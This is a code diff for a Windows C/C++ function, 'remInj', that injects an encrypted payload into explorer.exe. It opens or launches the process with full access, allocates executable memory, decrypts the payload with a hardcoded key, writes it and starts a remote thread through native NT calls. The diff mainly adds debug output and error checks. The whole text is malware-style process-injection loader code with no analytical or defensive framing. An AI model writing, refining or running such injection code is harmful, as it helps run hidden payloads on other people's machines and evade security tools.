@@ -14,13 +14,18 @@ STARTUPINFO info = { 0 };
 PROCESS_INFORMATION processInfo = { 0 };
 
 int remInj() {
-    if (findPID() != 0) {
-        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(findPID()));
+    DWORD pid = findPID();
+    if (pid != 0) {
+        printf("Found explorer.exe with PID: %d\n", pid);
+        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     }
     else if (CreateProcess(L"C:\\Windows\\explorer.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &info, &processInfo) != 0) {
-        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(findPID()));
+        pid = findPID();
+        printf("Created explorer.exe with PID: %d\n", pid);
+        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     }
     else {
+        printf("Failed to find or create explorer.exe\n");
         return 0;
     }
 
@@ -28,12 +33,26 @@ int remInj() {
     SIZE_T allocSize = sizeof(payload);
 
     status = NtAllocateVirtualMemory(processHandle, &remoteBuf, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!status) {
+    if (status == 0) {
+        printf("Allocated memory at: %p\n", remoteBuf);
+    }
+    else {
+        printf("Failed to allocate memory\n");
+        return 0;
     }
 
-    JITDecrypt(payload, sizeof(payload), 0x12345678);
+    DWORD keySeed = 0x12345678;
+    printf("Decrypting payload with key seed: 0x%x\n", keySeed);
+    JITDecrypt(payload, sizeof(payload), keySeed);
 
     status = NtWriteVirtualMemory(processHandle, remoteBuf, payload, sizeof(payload), NULL);
+    if (status == 0) {
+        printf("Payload written successfully\n");
+    }
+    else {
+        printf("Failed to write payload\n");
+        return 0;
+    }
 
     HANDLE hThread;
     NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, processHandle, remoteBuf, NULL, 0, 0, 0, 0, NULL);
